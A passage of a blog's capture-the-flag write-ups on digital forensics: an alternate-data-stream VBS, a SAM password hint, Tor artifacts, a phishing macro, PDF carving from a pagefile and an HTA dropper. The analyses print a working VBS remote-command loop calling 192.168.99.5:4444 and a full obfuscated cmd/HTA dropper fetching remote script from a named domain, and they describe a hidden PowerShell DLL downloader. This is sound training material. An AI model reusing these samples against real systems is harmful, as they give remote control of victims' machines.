button:\nSince we know that there is more to the challenge than just error messages, we ignore them and try to analyze the executable inside Ghidra tool which is basically a reverse engineering tool. This will end up being a rabbit whole. The most informative artifact we can find is the following:\nSearching what “ExeScript” is, we find that it is a tool that converts scripts to executables. So our file isn’t really an executable, but a script written in some programming language that is yet unknown to us, and that got later converted to an executable.\nThe Ghidra tool, or any other tool in general won’t help us analyze it further. We have to keep in mind that this is not a reverse engineering challenge but a forensic one, so we should instead focus and analyze the file itself since we know that it is some script masked as executable.\nThere are plenty ways to do this, with the simpler being windows dir command line options which reveals information about a file based on the option specified. Let’s try out a few options to see what is file really is. In windows, we can get information about a file with the dir command. To view some of the most popular options for dir, we can run help dir in cmd:\nStarting to try a few of the options, we get to a strange output in the dir /r one which according to the help manual shows alternate data streams of the file:\nThis output was far more interesting than the rest. It displays a “wininit.vbs” file and “$DATA” specifier at the end. Not knowing what Alternate data streams are, we google it. Immediately after we search it up, we get a lot of articles referring to this as a technique for hackers to store malicious payloads inside a file:\nSo we are definitely in the right track. We see that Alternate data streams are used to hide data inside a file. Ideally we would like to extract the data hidden in the GTAVI.exe, which in our case is a script called “wininit.vbs”.\nTurning back to google, we find that there are various ways to extract hidden ADS data inside a file, with one being the following Powershell command:\nPS C:\\Users\\connar\u0026gt; Get-Content -path .\\GTAVI.exe -Stream wininit.vbs Execute(chr(-658+CLng(\u0026#34;\u0026amp;H2e1\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H9e\u0026#34;)-46)\u0026amp;chr(-84831+CLng(\u0026#34;\u0026amp;H14bd3\u0026#34;))\u0026amp;chr(3372810/CLng(\u0026#34;\u0026amp;H7d7a\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H13c99\u0026#34;)-80938)\u0026amp;chr(6582950/CLng(\u0026#34;\u0026amp;He9c5\u0026#34;))\u0026amp;chr(1184000/CLng(\u0026#34;\u0026amp;H9088\u0026#34;))\u0026amp;chr(2118990/CLng(\u0026#34;\u0026amp;H77f6\u0026#34;))\u0026amp;chr(-49617+CLng(\u0026#34;\u0026amp;Hc249\u0026#34;))\u0026amp;chr(-72592+CLng(\u0026#34;\u0026amp;H11c00\u0026#34;))\u0026amp;chr(8797896/CLng(\u0026#34;\u0026amp;H13e36\u0026#34;))\u0026amp;chr(1559775/CLng(\u0026#34;\u0026amp;H3a07\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H1f38\u0026#34;)-7893)\u0026amp;chr(CLng(\u0026#34;\u0026amp;H741\u0026#34;)-1752)\u0026amp;chr(-40228+CLng(\u0026#34;\u0026amp;H9d98\u0026#34;))\u0026amp;chr(-219+CLng(\u0026#34;\u0026amp;He5\u0026#34;))\u0026amp;chr(-51578+CLng(\u0026#34;\u0026amp;Hc9c9\u0026#34;))\u0026amp;chr(3908740/CLng(\u0026#34;\u0026amp;H8ace\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H13bea\u0026#34;)-80842)\u0026amp;chr(CLng(\u0026#34;\u0026amp;Hac70\u0026#34;)-44075)\u0026amp;chr(4605144/CLng(\u0026#34;\u0026amp;H9dcc\u0026#34;))\u0026amp;chr(3951240/CLng(\u0026#34;\u0026amp;H8764\u0026#34;))\u0026amp;chr(-43857+CLng(\u0026#34;\u0026amp;Habc0\u0026#34;))\u0026amp;chr(-85810+CLng(\u0026#34;\u0026amp;H14fa4\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H75ee\u0026#34;)-30158)\u0026amp;chr(2633266/CLng(\u0026#34;\u0026amp;H7d71\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H118e\u0026#34;)-4393)\u0026amp;chr(4670380/CLng(\u0026#34;\u0026amp;H9ea4\u0026#34;))\u0026amp;chr(4316130/CLng(\u0026#34;\u0026amp;H901a\u0026#34;))\u0026amp;chr(-34584+CLng(\u0026#34;\u0026amp;H8785\u0026#34;))\u0026amp;chr(464297/CLng(\u0026#34;\u0026amp;H11f5\u0026#34;))\u0026amp;chr(1108032/CLng(\u0026#34;\u0026amp;H8742\u0026#34;))\u0026amp;chr(-60845+CLng(\u0026#34;\u0026amp;Hedfb\u0026#34;))\u0026amp;chr(7913047/CLng(\u0026#34;\u0026amp;H1320b\u0026#34;))\u0026amp;chr(-36133+CLng(\u0026#34;\u0026amp;H8d9d\u0026#34;))\u0026amp;chr(10981024/CLng(\u0026#34;\u0026amp;H171c8\u0026#34;))\u0026amp;chr(455520/CLng(\u0026#34;\u0026amp;Hb1f0\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H15525\u0026#34;)-87323)\u0026amp;chr(CLng(\u0026#34;\u0026amp;Hc375\u0026#34;)-49970)\u0026amp;chr(6283344/CLng(\u0026#34;\u0026amp;H136b0\u0026#34;))\u0026amp;chr(1773486/CLng(\u0026#34;\u0026amp;H58d1\u0026#34;))\u0026amp;chr(-22086+CLng(\u0026#34;\u0026amp;H5699\u0026#34;))\u0026amp;chr(7773360/CLng(\u0026#34;\u0026amp;H1697c\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H6edb\u0026#34;)-28347)\u0026amp;chr(-44523+CLng(\u0026#34;\u0026amp;Hae4e\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H13f72\u0026#34;)-81681)\u0026amp;chr(1170396/CLng(\u0026#34;\u0026amp;H2a55\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;Hdc9e\u0026#34;)-56370)\u0026amp;chr(-7656+CLng(\u0026#34;\u0026amp;H1e4a\u0026#34;))\u0026amp;chr(4666088/CLng(\u0026#34;\u0026amp;Hbbe8\u0026#34;))\u0026amp;chr(-9737+CLng(\u0026#34;\u0026amp;H266c\u0026#34;))\u0026amp;chr(-67498+CLng(\u0026#34;\u0026amp;H10815\u0026#34;))\u0026amp;chr(-88804+CLng(\u0026#34;\u0026amp;H15b39\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H15b7f\u0026#34;)-88845)\u0026amp;chr(-87680+CLng(\u0026#34;\u0026amp;H156ec\u0026#34;))\u0026amp;chr(110016/CLng(\u0026#34;\u0026amp;Hd6e\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;Ha5e7\u0026#34;)-42410)\u0026amp;chr(CLng(\u0026#34;\u0026amp;He821\u0026#34;)-59393)\u0026amp;chr(-60882+CLng(\u0026#34;\u0026amp;Hedf4\u0026#34;))\u0026amp;chr(4223960/CLng(\u0026#34;\u0026amp;H9ea7\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;Hde5c\u0026#34;)-56808)\u0026amp;chr(156600/CLng(\u0026#34;\u0026amp;H546\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H2119\u0026#34;)-8361)\u0026amp;chr(-14255+CLng(\u0026#34;\u0026amp;H37e9\u0026#34;))\u0026amp;chr(1476458/CLng(\u0026#34;\u0026amp;H7ab6\u0026#34;))\u0026amp;chr(169153/CLng(\u0026#34;\u0026amp;He0f\u0026#34;))\u0026amp;chr(CLng(\u0026#34;\u0026amp;H138d7\u0026#34;)-80038)\u0026amp;chr(CLng(\u0026#34;\u0026amp;H11d8d\u0026#34;)-73044)\u0026amp;chr(2498000/CLng(\u0026#34;\u0026amp;Hc328\u0026#34;))\u0026amp;chr(-28775+CLng(\u0026#34;\u0026amp;H7095\u0026#34;))\u0026amp;chr(-38472+CLng(\u0026#34;\u0026amp;H9679\u0026#34;))\u0026amp;chr(4931118/CLng(\u0026#34;\u0026amp;H164b5\u0026#34;))\u0026amp;chr(2246720/CLng(\u0026#34;\u0026amp;H9cb8\u0026#34;))\u0026amp;chr(2820444/CLng(\u0026#34;\u0026amp;Hef82\u0026#34;))\u0026amp;chr(3714006/CLng(\u0026#34;\u0026amp;Hfe86\u0026#34;))\u0026amp;chr(-70681+CLng(\u0026#34;\u0026amp;H11452\u0026#34;))\u0026amp;chr(4318066/CLng(\u0026#34;\u0026amp;H16eaf\u0026#34;))\u0026amp;chr(1358761/CLng(\u0026#34;\u0026amp;H6425\u0026#34;... And we get a lot of nonsense, which seems to be obfuscated code (whenever we have text that seems confusing, it is most probably been obfuscated).\nSo how do we go about recovering the actual context ?\nWe see that the hidden file is named “wininit.vbs”. We must pay attention in the “vbs” extension. With the info we have so far, we can search for how to deobfuscate vbs, which will essentially lead us to the following online tool:\nhttps://isvbscriptdead.com/vbs-obfuscator/ Visiting the online tool, it is suggested to replace the “Execute” keyword in our output with “MsgBox”, store this in a new file with “vbs” extension and run it. Following these instructions and running the script, we get the deobfuscated code:\nOption Explicit\rOn Error Resume Next\rCONST callbackUrl = \u0026#34;http://192.168.99.5:4444/\u0026#34;\rDim xmlHttpReq, shell, execObj, command, break, result\rSet shell = CreateObject(\u0026#34;WScript.Shell\u0026#34;)\rbreak = False\rfso = \u0026#34;Q1RGTElCe2gxZGQxbmdfMW5fdEgzX3N0UjM0bX0=\u0026#34;\rWhile break \u0026lt;\u0026gt; True\rSet xmlHttpReq = WScript.CreateObject(\u0026#34;MSXML2.ServerXMLHTTP\u0026#34;)\rxmlHttpReq.Open \u0026#34;GET\u0026#34;, callbackUrl, false\rxmlHttpReq.Send\rcommand = \u0026#34;cmd /c\u0026#34; \u0026amp; Trim(xmlHttpReq.responseText)\rif InStr(command, \u0026#34;EXIT\u0026#34;) Then\rbreak = True\rElse\rSet execObj = shell.Exec(command)\rresult = \u0026#34;\u0026#34;\rDo Until execObj.StdOut.AtEndOfStream\rresult = result \u0026amp; execObj.StdOut.ReadAll()\rLoop\rSet xmlHttpReq = WScript.CreateObject(\u0026#34;MSXML2.ServerXMLHTTP\u0026#34;)\rxmlHttpReq.Open \u0026#34;POST\u0026#34;, callbackUrl, false\rxmlHttpReq.Send(result)\rEnd If\rWend We are met with this deobfuscated VBS script. Analyzing the script further does not lead to anything interesting. The only thing that is suspicious is a variable called fso that is not used at all in the script. This variable is equal to a value that seems like a base64 encoded string (because of the equal sign in the end).\nTrying to decode it with CyberChef, we get a flag:\n\u0026gt;\u0026gt;\u0026gt; from base64 import b64decode \u0026gt;\u0026gt;\u0026gt; b64decode(\u0026#34;Q1RGTElCe2gxZGQxbmdfMW5fdEgzX3N0UjM0bX0=\u0026#34;) b\u0026#39;CTFLIB{h1dd1ng_1n_tH3_stR34m}\u0026#39; \u0026gt;\u0026gt;\u0026gt; Turns out that sometimes the simplest ways to analyze a file goes unnoticed to an analyst. We saw that the power of a reverse tool could not help at all, but some simple command line options solved the problem.\nThis shows that not all tools can be used for all the problems.\n","permalink":"http://localhost:1313/ctfwriteups/headstream/","summary":"\u003cp\u003eWe\u0026rsquo;ve been given a game to analyze that is supposedly malicious. Downloading the Game.rar file, we are met with an executable named \u0026ldquo;GTAVI.exe\u0026rdquo;.\u003cbr\u003e\nUpon running it inside a Virtual Machine (which should never be done in local systems when analyzing malware), the following error messages appear:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/ctflib/headstream/headstream1.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eAnd after clicking the \u0026lsquo;OK\u0026rsquo; button:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/ctflib/headstream/headstream2.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eSince we know that there is more to the challenge than just error messages, we ignore them and try to analyze the executable inside Ghidra tool which is basically a reverse engineering tool. This will end up being a rabbit whole. The most informative artifact we can find is the following:\u003c/p\u003e","title":"Headstream - Writeup"},{"content":"Extracting the contents of the zip file, we are met with a \u0026ldquo;Win7x64.mem” file. This is a memory dump file and can be analyzed with various tools. One of the tools that can analyze these type of files is called Volatility. Let’s see how it is used:\nVolatility, based on the provided file, tries to match what type of system this dump was taken from. The first suggestion it makes is Win7SP1x64 which is basically Windows 7 – 64 bit.\nNow that we have a profile for our memory dump file, we have to locate the password hint inside the memory dump in order to analyze it. Google will help us in this task:\nAlthough the Microsoft community forum does not show the full path, it suggests to look at the SAM (Security Account Manager) hive:\nSorry, I have no idea about the structure of the SAM file and where this information might be kept. Here are a couple of options:\r- Use a search engine in an attempt to find discussions that deal with this subject.\r- Take a copy of the SAM, then create a hint.Now take another copy and compare the two versions, using fc.exe /b. This community forum can be found at:\nhttps://answers.microsoft.com/en-us/windows/forum/all/user-account-password-hint-registry-location/596030e0-6b72-46ef-97bf-fdc77b3632c9 We will update our search based on the information found and look for the location of the password hint inside SAM:\nThis question in the following Stackexchange forum not only tells us where to look, but how to decrypt – or rather decode – it:\nThe post on the forum can be found at:\nhttps://security.stackexchange.com/questions/264896/is-there-a-way-to-get-windows-login-password-hint-from-sam-hive-with-volatility Going back to Volatility, we will query for the password hint based on the suggested path in the stackexchange forum:\nThe option “printkey -K” will print the information in the specified path. We see some Subkeys (imagine them as subfolders). These Subkeys are actually the users of the windows\tmachine written as codes instead of names. The answer of the question in the stackexchange suggests to use the after the “\\Users” Subkey. Using the first user code as the , we get:\nWe don’t see any password hint. Repeating for the rest of the users, we get a match at the usercode “000003E9”:\nOne way to recover the plaintext form of this (as the stackexchange answer suggested) is by the sample code provided in the answer. Another way is to make our own python script. But first, let’s understand a little bit more what this format we are looking at really is:\nSo the password hint is basically stored as hex with pairs of zeros in between each value. To recover the plaintext format, we have to:\nRemove dots: 4300540046004C00490042007B003500... Remove pairs of zeros: 4354464C49427B35... Convert from hex to bytes: flag = \u0026#34;4354464C49427B35305F6C306E365F7933375F35305F7733346B5F5F5F7D\u0026#34; print(bytes.fromhex(flag).decode()) Running the above two-liner script, we get the flag:\n┌──(connar㉿kali)-[~/hintingflags]\r└─$ python decryptingHint.py\rCTFLIB{50_l0n6_y37_50_w34k___} Another way is using the online tool “CyberChef”:\n","permalink":"http://localhost:1313/ctfwriteups/hintingflags/","summary":"\u003cp\u003eExtracting the contents of the zip file, we are met with a \u0026ldquo;Win7x64.mem” file. This is a memory dump file and can be analyzed with various tools. One of the tools that can analyze these type of files is called Volatility. Let’s see how it is used:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/ctflib/hintingflags/hintingflags1.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eVolatility, based on the provided file, tries to match what type of system this dump was taken from. The first suggestion it makes is Win7SP1x64 which is basically Windows 7 – 64 bit.\u003c/p\u003e","title":"Hinting flags - Writeup"},{"content":"The goal of this challenge is to find artifacts that prove the suspect user leaked some flags to a forum that hosts stolen databases for sale. So this is what we have to look for. Downloading the file, we are met with a zip file which contains the following:\nA google search about .aut files is enough to find out that a tool called Autopsy is needed to analyze this file (although the file autopsy.db implies this as well).\nOpening the challenge file in autopsy, we are met with the filesystem of the suspect user:\nAs it was stated earlier, we need to find proof of leaks to some stolen database marketplace. The way to go about solving this challenge is to make the critical thought on how could someone access such market. This is because, to leak information to a website, you must first visit it. One could think that the normal browsing history of the user would lead him to the answer but this is the wrong way to approach this problem. Online markets such as the one we are searching for is not accessible through normal browsers, but through a browser such as Tor.\nSo now we have to search on where information about Tor browser is stored. In other words, we want to do a forensic investigation on Tor browser. It is not a prerequisite to know where to search, so we will use google to find the answer.\nAmongst some articles, a great presentation about Tor forensics suggests looking in the following path:\nNavigating to these folders and enumerating a bit, we find a search query of the Tor Browser:\nWe see that a query for the infamous raid forums darknet market was made which contained the flag with some url encoding in it. We can use the online CyberChef tool to decode the flag:\n","permalink":"http://localhost:1313/ctfwriteups/insider/","summary":"\u003cp\u003eThe goal of this challenge is to find artifacts that prove the suspect user leaked some flags to a forum that hosts stolen databases for sale.  So this is what we have to look for. Downloading the file, we are met with a zip file which contains the following:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/ctflib/insider/insider1.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eA google search about .aut files is enough to find out that a tool called Autopsy is needed to analyze this file (although the file autopsy.db implies this as well).\u003cbr\u003e\nOpening the challenge file in autopsy, we are met with the filesystem of the suspect user:\u003c/p\u003e","title":"Insider - Writeup"},{"content":"We are provided with a .pst file which is essentially an outlook email file. We can either view it with online tools such as goldfynch or with command line tools such as readpst.\nThe goldfynch is the easier option so that’s what we are going to use:\nOpening the email, we view what seems to be a very sus message from presumably the IRS:\nAn archive is provided to the victim with a password set to recover the form. Archives with a password are usually a technique threat actors use to avoid detection of their malicious documents, since if the document had not been zipped with a password, gmail would not have allowed it to be sent. Anyway, let’s download and open it. Using the provided password, we get a Microsoft word file:\nMake sure to disable your windows defender if it automatically deletes the file after extraction (if you use windows to solve this chall). I will be using kali for this one.\nThe email implied that a form would be provided for the victim to fill and send to another goofie email, but we see just an image trying to convince the victim to enable macros (btw this image was taken by a real phishing campaign using irs) :\nLet’s view the macros that will get executed after we click enable. You can do it with either the olevba suite or with just enabling the developer tab in word and view them manually.\nRunning the command olevba [document], we get the following sus vba macros:\nWe see that this script is inside an AutoOpen sub, which means this will be executed as soon as the enable macros has been clicked.\nAlthough we see some seemingly legitimate but unused variables (which is usually used to change the entropy of the file), there are some keypoints to notice here.\nFirst off, we see the line “tt = ThisDocument.BuiltInDocumentProperties(\u0026ldquo;Content status\u0026rdquo;).Value” which tries to get something from the document properties, specifically the content status value.\nThen, it takes this value and reverses it in the line “oinfer = StrReverse(tt)”.\nAfter that, we have a very sus line “jjfre = Chr(112) \u0026amp; Chr(111) \u0026amp; Chr(119) …” which creates a command with the Chr() method. Let’s run this line and see what is been created:\n\u0026gt;\u0026gt;\u0026gt; jjfre = jjfre.replace(\u0026#34;Chr\u0026#34;, \u0026#34;chr\u0026#34;).replace(\u0026#34;\u0026amp;\u0026#34;, \u0026#34;+\u0026#34;) \u0026gt;\u0026gt;\u0026gt; eval(jjfre) \u0026#39;powershell.exe -WindowsStyle -ExecutionPolicy Bypass -Command\u0026#39; I have not placed the whole command yet since we don’t know at this point what the content status value is that is being used in this command, but essentially a powershell command is being constructed.\nAt the very end, we see that this powershell command is being executed in hidden mode with the line “CreateObject(\u0026ldquo;WScript.Shell\u0026rdquo;).Run jjfre, 0, False”.\nLet’s try and find what the content status value is that is being reversed and then used. You can either do it manually through the document info-\u0026gt;properties-\u0026gt;show all or by unzipping the document itself and observe its actual structure:\nSearching through the files, we eventually find in the DocumentSummaryInformation a very sus string:\nReversing it, as the vba code implied, we get this clearer powershell obfuscated script:\nA good way in general to deobfuscate fast scripts like this is to just run it in an isolated vm/online powershell interpreters like tio.run.\nUsing an isolated vm and disabling windows defender, we get this deobfuscated script:\nWe see some replacement operations being done in some initial variables, so let’s mimic the operations:\nNice! So we see some urls that the script tries to reach and download and execute a dll hosted to one of them.\nSince there is nothing more to it, let’s observe the urls. They kinda look like b64 so if we try to decode the files that each url tries to get, we eventually get a hit on h[x][x]p://romancebrazil.com/gallery/9/Q1RGTElCezVuMzR8PHlfTTM3NGQ0NzR9/:\n\u0026gt;\u0026gt;\u0026gt; from base64 import b64decode \u0026gt;\u0026gt;\u0026gt; b64decode(b\u0026#34;Q1RGTElCezVuMzR8PHlfTTM3NGQ0NzR9\u0026#34;) b\u0026#39;CTFLIB{5n34}\u0026lt;y_M374d474}\u0026#39; \u0026gt;\u0026gt;\u0026gt; This is it for this one :)\n","permalink":"http://localhost:1313/ctfwriteups/irswentphishing/","summary":"\u003cp\u003eWe are provided with a .pst file which is essentially an outlook email file. We can either view it with online tools such as goldfynch or with command line tools such as readpst.\u003c/p\u003e\n\u003cp\u003eThe goldfynch is the easier option so that’s what we are going to use:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/ctflib/irswentphishing/irs1.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eOpening the email, we view what seems to be a very sus message from presumably the IRS:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/ctflib/irswentphishing/irs2.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e","title":"IRS went phishing - Writeup"},{"content":"We are provided with a file named “pagefile.sys” which is used in virtual memory as said in the description of the challenge. Searching more on this file, we find:\nPagefile.sys is a system file in Windows set aside for your computer\u0026#39;s Random Access Memory (RAM), also known as physical memory. When your computer\u0026#39;s RAM begins to run out of memory, it uses the pagefile to offload data it doesn\u0026#39;t need, such as files and apps. So based on that, we conclude that pagefile.sys has files and apps inside it and from the description of the challenge we are looking for a pdf file. But how can we extract it ?\nBy doing a little bit of research, we find that we can extract files based on their hex representation where we can view file headers and map the beginning and end of a file. A program that converts bytes of a file or program to hex is HxD which can be found at:\nhttps://mh-nexus.de/en/hxd/ So all we have to do after we download the tool is to load the given challenge file and search for start of file and end of file headers for pdf files. The whole hex block between these two corresponding pdf headers will be the file we want to extract. We will copy this block and save it as a new file with pdf extension at the end. If we have found the correct block for a presumable pdf file, it will open with no errors for us to view. So let’s begin.\nSearching for pdf file headers, we find the following table:\nWhere the second column is the start of file signature in hex (header) and the third column are all the possible end of file signatures in hex for pdf files of Adobe (since the challenge itself refers to Adobe Reader).\nTo extract pdf files based on the headers, we first need to search for the starting header of the pdf. This can be done by using CTRL+F and writing the hex values of the pdf header. After doing so, we will find many pdfs, such as the following:\nNow we need to find where this pdf ends. Searching some of the end of file (EOF) signatures from the table we saw earlier, we get to this offset:\nNow, there are two ways to extract the block for this pdf:\nHard way: Highlight and scroll all the way from the start of file signature until the end of file signature. Easy way: Right click on the highlighted start of file signature and select “select block” option. In the menu that will appear, use the end of file signature location we found and select the whole block. The method we are going to use is the easy one.\nStarting off, we find the start of file signature and click “select block”:\nWe take note of this address. We then do the same for the end of file signature:\nWe then use the starting offset we took note off earlier.\nNow, by clicking OK, the whole block is highlighted for us. We copy the whole block and save it in a new file as a pdf:\nLet’s open the file we just extracted to see if this is the correct pdf file. Remember that the pdf the user was reading had to do with virtual memory:\nThis is not the correct pdf since it has nothing to do with virtual memory theory. But it is a good lead since this picture is a meme for “never giving up”.\nNot giving up and continuing our “carving” (as depicted in the picture), we find the next occurrence of the corresponding version of pdf and by following the same process as before and end up with this pdf:\nSo this is probably the correct pdf.\nNow we have to analyze it since the description of the challenge states it is malicious.\nOne common thing for malicious pdf files is that they have javascript embedded in them, which gets executed upon opening/closing the pdf. And this is exactly what the description stated.\nOne traditional way of analyzing pdf files is by opening them in a text editor, such as notepad:\nAnalyzing a pdf from a text editor is not an easy task. Pdf’s have a strange structure. In short, they contain objects and each object points to another object.\nOne good thing about opening pdf files in text editor as an initial analysis step is that we can spot that javascript actually exists in the pdf:\nWe see that object 41 has a reference to javascript and it points to another object, the object 42. Object 42 as we can see contains javascript code that has been encoded with FlateEncoder. So this is as far as we can get with text editor analysis.\nTo continue our analysis, we can use existing tools such as “peepdf” which has the ability to extract javascript from pdf files.\nNavigating to a VM (since this is supposedly malware), we download the peepdf tool from its github repository and run it. The repository is the following:\nhttps://github.com/jesparza/peepdf Running the tool in python2, we get the following:\nWe can see that some objects have javascript code in them. Specifically, we can see that the object that has javascript code in it is the object 42, the same object we previously found in the text editor analysis:\nIt might be confusing of what this javascript code does since its been obfuscated but it basically XOR’s every element of a list with the number 5, then converts it to a string and adds it to an empty string. When the loop is finished, a final string has been contructed, which is used inside a SOAP request.\nTo deobfuscate this code, let’s open an online javascript editor and change the SOAP.connect command to console.log in order to print the constructed string instead of connecting to it:\nBy doing that, we get the flag.\n","permalink":"http://localhost:1313/ctfwriteups/malwarecarving/","summary":"\u003cp\u003eWe are provided with a file named “pagefile.sys” which is used in virtual memory as said in the description of the challenge. Searching more on this file, we find:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ePagefile.sys is a system file in Windows set aside for your computer\u0026#39;s Random Access Memory (RAM), also known as physical memory. When your computer\u0026#39;s RAM begins to run out of memory, it uses the pagefile to offload data it doesn\u0026#39;t need, such as files and apps.\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eSo based on that, we conclude that pagefile.sys has files and apps inside it and from the description of the challenge we are looking for a pdf file. But how can  we extract it ?\u003cbr\u003e\nBy doing a little bit of research, we find that we can extract files based on their hex representation where we can view file headers and map the beginning and end of a file. A program that converts bytes of a file or program to hex is HxD which can be found at:\u003c/p\u003e","title":"Malware Carving - Writeup"},{"content":"This is a writeup for the Mr Anderson challenge This challenge gives us a zip file containing 3 pcap files:\nWhat we have to do is to first find the order of the scripts that were executed in the attack in order to know what was executed first, what other file it dropped etc.\nWe can easily identify the order by opening all 3 pcaps and observing the date and time of the first packet of each pcap.\nBy doing so, we notice that firstly, an .hta file was downloaded and run. This .hta file probably downloaded the second file which is a javascript file, and this javascript file probably downloaded the last file which is a .bat one.\nWe can export all the files through File\u0026ndash;\u0026gt;Export Objects\u0026ndash;\u0026gt;HTTP.\nLet\u0026rsquo;s start analyzing the first file: \u0026ldquo;noticeJuly.hta\u0026rdquo; Running the file, we are met with the following window:\nOpening the file in a text editor, we observe the following fake looking page:\nWe see a very suspicious command that is executed upon clicking the Refresh Button. We can use the CMD Watcher tool (not that it is needed) to see that indeed this sus looking command is being run upon clicking the button:\nLet\u0026rsquo;s analyze this command that is being run. The command is the following:\nC:\\Windows\\System32\\cONhosT.exe %COMSpeC% /V/D/c \u0026#34;S^eT SSG=C:\\kfldeokgr\\\u0026amp;\u0026amp; mD !SSG!\u0026gt;nul 2\u0026gt;\u0026amp;1\u0026amp;\u0026amp;S^eT UFWN=!SSG!^KGRAAKR.JS\u0026amp;\u0026amp;\u0026lt;nul set/p LAXA=var LAXA=\u0026#39;\\u0055\\u004c\\u0064\\u002b\\u0044\\u0055\\u004c\\u0064\\u002b\\u0045\\u0055\\u004c\\u0064\\u002b\\u0022\\u002f\\u002f\\u0063\\u0030\\u0072\\u0061\\u0078\\u002e\\u0065\\u0070\\u0068\\u0033\\u006b\\u0064\\u006f\\u006c\\u006d\\u0066\\u0061\\u002e\\u0063\\u006c\\u006f\\u0075\\u0064\\u002f\\u003f\\u0032\\u002f\\u0022\\u0029\\u003b\u0026#39;;SSG=\u0026#39;\\u003a\\u0068\\u0022\\u003b\\u0045\\u0055\\u004c\\u0064\\u003d\\u0022\\u0054\\u0074\\u0022\\u002b\\u0022\\u0050\\u003a\\u0022\\u003b\\u0047\\u0065\\u0074\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u0028\\u0043\u0026#39;;PEBC=\u0026#39;\\u0076\\u0061\\u0072\\u0020\\u0043\\u0055\\u004c\\u0064\\u003d\\u0022\\u0073\\u0022\\u002b\\u0022\\u0063\\u0072\\u0022\\u003b\\u0044\\u0055\\u004c\\u0064\\u003d\\u0022\\u0069\\u0070\\u0074\\u0022\\u002b\\u0022\u0026#39;;UFWN=PEBC+SSG+LAXA;PADO=new Function(UFWN);PADO(); \u0026gt;!UFWN!|caLl !UFWN!||caLl !UFWN! \u0026#34; Firstly, let\u0026rsquo;s take the unicode values and convert them to plaintext. You can use this cyberchef command to decode them:\nCyberChef Command The command that is left is the following:\nC:\\Windows\\System32\\cONhosT.exe %COMSpeC% /V/D/c \u0026#34;S^eT SSG=C:\\kfldeokgr\\\u0026amp;\u0026amp; mD !SSG!\u0026gt;nul 2\u0026gt;\u0026amp;1\u0026amp;\u0026amp;S^eT UFWN=!SSG!^KGRAAKR.JS\u0026amp;\u0026amp;\u0026lt;nul set/p LAXA=var LAXA=\u0026#39;ULd+DULd+EULd+\u0026#34;//c0rax.eph3kdolmfa.cloud/?2/\u0026#34;);\u0026#39;;SSG=\u0026#39;:h\u0026#34;;EULd=\u0026#34;Tt\u0026#34;+\u0026#34;P:\u0026#34;;GetObject(C\u0026#39;;PEBC=\u0026#39;var CULd=\u0026#34;s\u0026#34;+\u0026#34;cr\u0026#34;;DULd=\u0026#34;ipt\u0026#34;+\u0026#34;\u0026#39;;UFWN=PEBC+SSG+LAXA;PADO=new Function(UFWN);PADO(); \u0026gt;!UFWN!|caLl !UFWN!||caLl !UFWN! \u0026#34; Analyzing the command, here are the takeaways:\nC:\\Windows\\System32\\cONhosT.exe %COMSpeC% /V/D/c: It will open a cmd window with the /V/D/c parameters. S^eT SSG=C:\\kfldeokgr\\\u0026amp;\u0026amp; mD !SSG!\u0026gt;nul 2\u0026gt;\u0026amp;1: Sets a variable SSG to a path and then creats this path using mD (an alias for make directory), redirecting the output accordingly. S^eT UFWN=!SSG!^PEBCPADO.JS: Sets the previously mentioned path with a .js filename to the variable UFWN. \u0026lt;nul set/p LAXA=var LAXA='ULd+DULd+EULd+\u0026quot;//c0rax.eph3kdolmfa.cloud/?2/\u0026quot;);';\rSSG=':h\u0026quot;;EULd=\u0026quot;Tt\u0026quot;+\u0026quot;P:\u0026quot;;GetObject(C';PEBC='var CULd=\u0026quot;s\u0026quot;+\u0026quot;cr\u0026quot;;DULd=\u0026quot;ipt\u0026quot;+\u0026quot;';\rUFWN=PEBC+SSG+LAXA: This basically creates some javascript code and stores it in the LAXA variable. PADO=new Function(UFWN);PADO(): This creates a js function with the code set in UFWN variable and runs it. By deobfuscating the js code, we are basically left with this code:\nvar CULd=\u0026#34;s\u0026#34;+\u0026#34;cr\u0026#34;; DULd=\u0026#34;ipt\u0026#34;+\u0026#34;:h\u0026#34;; EULd=\u0026#34;Tt\u0026#34;+\u0026#34;P:\u0026#34;; GetObject(CULd+DULd+EULd+\u0026#34;//c0rax.eph3kdolmfa.cloud/?2/\u0026#34;); //which basically is--\u0026gt; script:http://c0rax.eph3kdolmfa.cloud/?2/ This is all for the .hta file. It creates a .js file. This .js file creates an instance of a COM object retrieved from the specified url.\nFinally, by using \u0026gt;!UFWN!|caLl !UFWN!||caLl !UFWN! the .js file is run. 